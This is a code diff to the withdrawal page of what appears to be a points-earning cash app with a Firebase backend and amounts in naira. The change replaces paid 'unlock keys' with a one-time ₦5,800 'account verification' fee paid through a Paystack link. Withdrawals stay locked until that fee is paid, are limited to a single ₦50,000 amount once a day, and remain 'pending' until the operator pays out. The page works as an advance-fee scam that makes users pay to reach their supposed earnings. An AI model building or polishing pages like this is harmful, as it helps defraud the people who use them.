@@ -35,16 +35,20 @@ body{margin:0;min-height:100vh;font-family:system-ui,-apple-system,"Segoe UI",Ro
 .tier b{font-size:1.1rem}
 .tier small{display:block;color:var(--muted);font-size:.78rem;margin-top:2px}
 .tier .pend{color:var(--gold);font-weight:700}
-.acts{display:grid;gap:6px;min-width:110px}
+.acts{display:grid;gap:6px;min-width:120px}
 .acts button{font:inherit;font-size:.82rem;border-radius:10px;padding:9px 10px;font-weight:700;cursor:pointer;border:0}
 .acts .buy{background:var(--card);color:var(--text);border:1px solid var(--border)}
 .acts .wd{background:var(--primary);color:#fff}
+.acts .wd.locked{background:var(--bad);opacity:1;font-weight:900;letter-spacing:.2px}
+.lockmsg{background:rgba(217,63,63,.1);border:1px solid var(--bad);border-radius:12px;padding:12px;font-size:.9rem;line-height:1.5;margin-top:12px}
+.lockmsg b{color:var(--bad)}
 .acts button:disabled{opacity:.45;cursor:not-allowed}
 label{display:block;font-size:.82rem;color:var(--muted);margin:10px 0 4px;font-weight:600}
 input{width:100%;font:inherit;padding:12px;border-radius:12px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:4px}
 button.go{font:inherit;border:0;border-radius:12px;padding:13px 14px;font-weight:700;cursor:pointer;background:var(--primary);color:#fff;width:100%;margin-top:12px}
 button.go:disabled{opacity:.5;cursor:not-allowed}
 .hint{color:var(--muted);font-size:.82rem;line-height:1.5;margin:2px 0 0}
+.paylink{display:block;text-align:center;text-decoration:none;background:var(--good);color:#fff;font-weight:800;border-radius:12px;padding:13px 14px;margin:12px 0}
 .pay{background:var(--soft);border:1px solid var(--border);border-radius:12px;padding:12px;font-size:.9rem;line-height:1.6;margin-bottom:6px}
 .msg{min-height:1.2em;font-size:.84rem;margin:8px 0 0}
 .msg.err{color:var(--bad)} .msg.ok{color:var(--good)}
@@ -61,7 +65,7 @@ footer a.on{color:var(--fon)} footer a:active{background:var(--fln)}
 <div class="wrap">
   <div class="top">
     <a class="back" href="index.html" aria-label="Back to wallet">←</a>
-    <div><h1>Withdraw</h1><p>Unlock once, withdraw anytime</p></div>
+    <div><h1>Withdraw</h1><p>Request a payout to your bank</p></div>
   </div>
 
   <div id="loading" class="center">Loading…</div>
@@ -72,22 +76,27 @@ footer a.on{color:var(--fon)} footer a:active{background:var(--fln)}
     </section>
 
     <section class="card">
-      <h2>Choose an amount to unlock</h2>
-      <div class="tiers" id="tiers"></div>
-      <p class="hint"><b>How it works:</b> Buy a key one time to unlock an amount. Once unlocked, it stays unlocked forever. You can then withdraw that amount as many times as you want, whenever you want. You never need to buy the same key again.</p>
+      <h2>Withdraw</h2>
+      <div class="tier">
+        <div><b id="tAmt"></b><small id="tUsd"></small><small id="tStat"></small></div>
+        <div class="acts"><button class="wd locked" id="wdBtn"></button></div>
+      </div>
+      <div class="lockmsg hidden" id="lockMsg">🔒 <b>Withdrawals are locked.</b> You will need to verify your account with a sum of <b id="feeTxt"></b> before you can unlock withdrawals.
+        <button class="go" id="verifyOpen">Verify my account</button></div>
+      <p class="hint" style="margin-top:12px">The minimum withdrawal is <span class="minTxt"></span>, and <span class="minTxt"></span> is the only amount you can withdraw. You can withdraw once a day. Verification is paid one time only, and your account stays verified forever.</p>
     </section>
 
     <section class="card hidden" id="buyPanel">
-      <h2 id="buyTitle">Buy key</h2>
+      <h2>Verify your account</h2>
       <div class="pay" id="payInfo"></div>
-      <label for="ref">Transfer reference or sender name</label>
-      <input id="ref" maxlength="120" placeholder="e.g. your name on the transfer">
+      <label for="ref">Paystack reference or email used to pay</label>
+      <input id="ref" maxlength="120" placeholder="e.g. the reference on your Paystack receipt">
       <button class="go" id="buyBtn">I have paid</button>
       <p class="msg" id="buyMsg"></p>
     </section>
 
     <section class="card hidden" id="wdPanel">
-      <h2 id="wdTitle">Withdrawal details</h2>
+      <h2>Withdrawal details</h2>
       <p class="hint" id="wdSummary"></p>
       <label for="bank">Bank name</label>
       <input id="bank" maxlength="60" placeholder="e.g. GTBank">
@@ -99,7 +108,7 @@ footer a.on{color:var(--fon)} footer a:active{background:var(--fln)}
       <p class="msg" id="msg"></p>
     </section>
 
-    <div class="warn">Your key is <b>not</b> used up when you withdraw. The points for the amount are taken from your balance as soon as you submit, and your request stays <b>pending</b> until it is paid. A key is unlocked after we confirm your payment. Please check your account details carefully, because wrong details can delay or lose your money.</div>
+    <div class="warn">The points are taken from your balance as soon as you submit, and your request stays <b>pending</b> until it is paid. Please check your account details carefully, because wrong details can delay or lose your money.</div>
   </div>
 </div>
 
@@ -117,10 +126,10 @@ import { getFirestore, doc, collection, query, where, addDoc, onSnapshot, runTra
 /* ============ CONFIG: EDIT THESE ============ */
 const POINTS_PER_USD = 100;   // must match home.html
 const NGN_RATE       = 1500;  // fixed rate, same as the farm
-const TIERS          = [50000, 100000, 200000, 300000, 400000, 500000]; // withdrawal amounts in naira
-const KEY_PRICE      = t => t / 5;  // key costs 20% of the amount: 50,000 -> 10,000 (edit per tier if needed)
-// Where players send the key payment (YOUR account):
-const PAY_BANK = "YOUR BANK NAME", PAY_NUMBER = "YOUR ACCOUNT NUMBER", PAY_NAME = "YOUR ACCOUNT NAME";
+const WITHDRAW_NGN   = 50000; // the only amount that can be withdrawn
+const VERIFY_FEE     = 5800;  // one-time account verification, in naira
+// Paystack page where players pay the verification fee:
+const VERIFY_LINK = "https://paystack.shop/pay/wftws-3qga";
 const LOGIN_PAGE     = "../login.html";
 const firebaseConfig = {
   apiKey:"AIzaSyA2LtEPKS6jU3nIsAj-KV3MoxmUULj_5a8", authDomain:"urgent-cash-76162.firebaseapp.com",
@@ -129,63 +138,70 @@ const firebaseConfig = {
 };
 /* ============================================ */
 
+const DAY = 86400000;
 const app = initializeApp(firebaseConfig), auth = getAuth(app), db = getFirestore(app);
 const $ = id => document.getElementById(id);
 const usd = v => "$" + v.toLocaleString("en-US", { minimumFractionDigits:2, maximumFractionDigits:2 });
 const ngn = v => "₦" + v.toLocaleString("en-NG", { maximumFractionDigits:0 });
-const tierUsd = t => Math.round(t / NGN_RATE * 100) / 100;
-const tierPts = t => Math.round(t * POINTS_PER_USD / NGN_RATE);
+const AMT_USD = Math.round(WITHDRAW_NGN / NGN_RATE * 100) / 100;
+const AMT_PTS = Math.round(WITHDRAW_NGN * POINTS_PER_USD / NGN_RATE);
 const setMsg = (id, t, k) => { $(id).textContent = t || ""; $(id).className = "msg" + (k ? " " + k : ""); };
 
-let user = null, balPts = 0, keys = [], reqs = [], sel = null; // sel = { mode:"buy"|"wd", tier }
+let user = null, balPts = 0, verified = false, lastAt = 0, verifyPending = false;
 
-const unlockKey = t => keys.find(k => k.tier === t);
-const pendingKeys = t => reqs.filter(r => r.type === "key" && r.status === "pending" && r.tier === t).length;
+document.querySelectorAll(".minTxt").forEach(e => e.textContent = ngn(WITHDRAW_NGN));
+$("tAmt").textContent = ngn(WITHDRAW_NGN);
+$("tUsd").textContent = "≈ " + usd(AMT_USD);
+$("feeTxt").textContent = ngn(VERIFY_FEE);
+$("payInfo").innerHTML = "Pay <b>" + ngn(VERIFY_FEE) + "</b> one time to verify your account.<a class=\"paylink\" href=\"" + VERIFY_LINK + "\" target=\"_blank\" rel=\"noopener noreferrer\">Pay " + ngn(VERIFY_FEE) + " on Paystack</a>After you pay, enter your Paystack reference (or the email you paid with) below and tap “I have paid”.";
+$("wdSummary").textContent = "You will get " + ngn(WITHDRAW_NGN) + " (about " + usd(AMT_USD) + "). We take " + AMT_PTS.toLocaleString() + " points from your balance. You can withdraw once a day.";
 
-function drawTiers(){
-  $("tiers").innerHTML = TIERS.map(t => {
-    const un = !!unlockKey(t), p = pendingKeys(t);
-    return `<div class="tier ${sel && sel.tier === t ? "sel" : ""}">
-      <div><b>${ngn(t)}</b><small>≈ ${usd(tierUsd(t))}</small>
-        <small>${un ? "✅ Unlocked forever" : "🔒 Locked · Key: " + ngn(KEY_PRICE(t))}</small>
-        ${p ? `<small class="pend">⏳ ${p} key payment pending</small>` : ""}</div>
-      <div class="acts">
-        ${un ? "" : `<button class="buy" data-buy="${t}">Buy key</button>`}
-        <button class="wd" data-wd="${t}" ${un ? "" : "disabled"}>Withdraw</button>
-      </div></div>`;
-  }).join("");
-  document.querySelectorAll("[data-buy]").forEach(b => b.onclick = () => open("buy", +b.dataset.buy));
-  document.querySelectorAll("[data-wd]").forEach(b => b.onclick = () => open("wd", +b.dataset.wd));
+function waitText(){
+  const left = lastAt + DAY - Date.now();
+  if (left <= 0) return "";
+  const h = Math.floor(left / 3600000), m = Math.ceil((left % 3600000) / 60000);
+  return "Next withdrawal in " + h + "h " + m + "m";
 }
-
-function open(mode, tier){
-  sel = { mode, tier };
-  $("buyPanel").classList.toggle("hidden", mode !== "buy");
-  $("wdPanel").classList.toggle("hidden", mode !== "wd");
-  setMsg("buyMsg", ""); setMsg("msg", "");
-  if (mode === "buy"){
-    $("buyTitle").textContent = "Buy key to unlock " + ngn(tier);
-    $("payInfo").innerHTML = "Pay <b>" + ngn(KEY_PRICE(tier)) + "</b> one time to unlock " + ngn(tier) + " forever. Send the money to:<br>" + PAY_BANK + "<br><b>" + PAY_NUMBER + "</b><br>" + PAY_NAME + "<br><br>After you pay, enter your reference below and tap “I have paid”.";
+function draw(){
+  const wait = verified ? waitText() : "";
+  const btn = $("wdBtn");
+  if (!verified){
+    btn.textContent = "🔒 LOCKED"; btn.className = "wd locked"; btn.disabled = false;
+    $("tStat").textContent = verifyPending ? "⏳ Verification payment pending" : "Verify your account to unlock";
+    $("lockMsg").classList.toggle("hidden", false);
+    $("verifyOpen").classList.toggle("hidden", verifyPending);
   } else {
-    $("wdTitle").textContent = "Withdraw " + ngn(tier);
-    $("wdSummary").textContent = "This amount is unlocked. You will get " + ngn(tier) + " (about " + usd(tierUsd(tier)) + "). We take " + tierPts(tier).toLocaleString() + " points from your balance. Your key stays unlocked, so you can withdraw this amount again later.";
+    $("lockMsg").classList.add("hidden"); $("buyPanel").classList.add("hidden");
+    $("tStat").textContent = wait || "✅ Account verified";
+    btn.textContent = wait ? "Come back later" : "Withdraw"; btn.className = "wd"; btn.disabled = !!wait;
+    if (wait) $("wdPanel").classList.add("hidden");
   }
-  drawTiers();
-  $(mode === "buy" ? "buyPanel" : "wdPanel").scrollIntoView({ behavior:"smooth", block:"center" });
 }
+setInterval(draw, 30000);
+
+function openBuy(){
+  if (verifyPending) return;
+  $("buyPanel").classList.remove("hidden"); $("wdPanel").classList.add("hidden");
+  setMsg("buyMsg", ""); $("buyPanel").scrollIntoView({ behavior:"smooth", block:"center" });
+}
+$("verifyOpen").onclick = openBuy;
+$("wdBtn").onclick = () => {
+  if (!verified) { $("lockMsg").scrollIntoView({ behavior:"smooth", block:"center" }); return; }
+  $("wdPanel").classList.remove("hidden"); $("buyPanel").classList.add("hidden");
+  setMsg("msg", ""); $("wdPanel").scrollIntoView({ behavior:"smooth", block:"center" });
+};
 
 $("buyBtn").onclick = async () => {
   setMsg("buyMsg", "");
   const ref = $("ref").value.trim();
-  if (!sel || sel.mode !== "buy") return;
-  if (ref.length < 2) return setMsg("buyMsg", "Enter the transfer reference or sender name.", "err");
+  if (ref.length < 2) return setMsg("buyMsg", "Enter the Paystack reference or the email you paid with.", "err");
   $("buyBtn").disabled = true;
   try {
     await addDoc(collection(db, "walletRequests"), {
-      uid:user.uid, email:user.email || "", type:"key", status:"pending",
-      tier:sel.tier, priceNgn:KEY_PRICE(sel.tier), reference:ref, createdAt:serverTimestamp()
+      uid:user.uid, email:user.email || "", type:"verify", status:"pending",
+      priceNgn:VERIFY_FEE, reference:ref, createdAt:serverTimestamp()
     });
-    setMsg("buyMsg", "Payment sent. Your amount will be unlocked as soon as we confirm your payment.", "ok");
+    setMsg("buyMsg", "Payment sent. Your account will be verified as soon as we confirm your payment.", "ok");
     $("ref").value = "";
   } catch (e) { console.error(e); setMsg("buyMsg", "Could not submit. Check your connection and try again.", "err"); }
   $("buyBtn").disabled = false;
@@ -193,31 +209,32 @@ $("buyBtn").onclick = async () => {
 
 $("sendBtn").onclick = async () => {
   setMsg("msg", "");
-  if (!sel || sel.mode !== "wd") return;
-  const tier = sel.tier, amountUsd = tierUsd(tier), pts = tierPts(tier);
+  if (!verified) return setMsg("msg", "Please verify your account first.", "err");
   const bank = $("bank").value.trim(), num = $("num").value.trim(), aname = $("aname").value.trim();
   if (bank.length < 2 || aname.length < 2) return setMsg("msg", "Enter the bank name and account name.", "err");
   if (!/^\d{6,20}$/.test(num)) return setMsg("msg", "Enter a valid account number (digits only).", "err");
-  const k = unlockKey(tier);
-  if (!k) return setMsg("msg", "Please buy the key to unlock " + ngn(tier) + " first.", "err");
   $("sendBtn").disabled = true;
   try {
-    const uref = doc(db, "users", user.uid), rref = doc(collection(db, "walletRequests"));
+    const uref = doc(db, "users", user.uid), lref = doc(db, "withdrawLimits", user.uid), rref = doc(collection(db, "walletRequests"));
     await runTransaction(db, async tx => {
-      const us = await tx.get(uref);
+      const us = await tx.get(uref), ls = await tx.get(lref);
       const have = (us.exists() && us.data().state && us.data().state.pts) || 0;
-      if (have < pts) throw new Error("balance: Your balance is too low for " + ngn(tier) + ".");
-      tx.update(uref, { "state.pts":increment(-pts) });
+      const last = ls.exists() && ls.data().lastAt && ls.data().lastAt.toMillis ? ls.data().lastAt.toMillis() : 0;
+      if (Date.now() < last + DAY) throw new Error("wait: You can only withdraw once a day. Please try again later.");
+      if (have < AMT_PTS) throw new Error("balance: Your balance is too low for " + ngn(WITHDRAW_NGN) + ".");
+      tx.update(uref, { "state.pts":increment(-AMT_PTS) });
+      tx.set(lref, { lastAt:serverTimestamp() });
       tx.set(rref, {
         uid:user.uid, email:user.email || "", type:"withdraw", status:"pending",
-        amountNgn:tier, amountUsd, points:pts, keyId:k.id, bank, accountNumber:num, accountName:aname, createdAt:serverTimestamp()
+        amountNgn:WITHDRAW_NGN, amountUsd:AMT_USD, points:AMT_PTS, bank, accountNumber:num, accountName:aname, createdAt:serverTimestamp()
       });
     });
     setMsg("msg", "Withdrawal requested. It shows as pending until it is paid.", "ok");
+    $("wdPanel").classList.add("hidden");
   } catch (e) {
     console.error(e);
     const m = e.message || "";
-    setMsg("msg", m.indexOf("balance:") === 0 ? m.slice(9) : "Could not submit. Check your connection and try again.", "err");
+    setMsg("msg", m.indexOf("balance:") === 0 || m.indexOf("wait:") === 0 ? m.slice(m.indexOf(":") + 2) : "Could not submit. Check your connection and try again.", "err");
   }
   $("sendBtn").disabled = false;
 };
@@ -229,13 +246,14 @@ onAuthStateChanged(auth, u => {
     balPts = (snap.exists() && snap.data().state && snap.data().state.pts) || 0;
     $("avail").textContent = usd(balPts / POINTS_PER_USD);
   });
-  onSnapshot(query(collection(db, "withdrawKeys"), where("uid", "==", u.uid)), snap => {
-    keys = snap.docs.map(d => ({ id:d.id, ...d.data() })); drawTiers();
+  onSnapshot(doc(db, "verifications", u.uid), snap => { verified = snap.exists(); draw(); }, e => console.error(e));
+  onSnapshot(doc(db, "withdrawLimits", u.uid), snap => {
+    lastAt = snap.exists() && snap.data().lastAt && snap.data().lastAt.toMillis ? snap.data().lastAt.toMillis() : 0; draw();
   }, e => console.error(e));
   onSnapshot(query(collection(db, "walletRequests"), where("uid", "==", u.uid)), snap => {
-    reqs = snap.docs.map(d => d.data()); drawTiers();
+    verifyPending = snap.docs.some(d => d.data().type === "verify" && d.data().status === "pending"); draw();
   }, e => console.error(e));
-  drawTiers();
+  draw();
   $("loading").classList.add("hidden"); $("main").classList.remove("hidden");
 });
 </script>
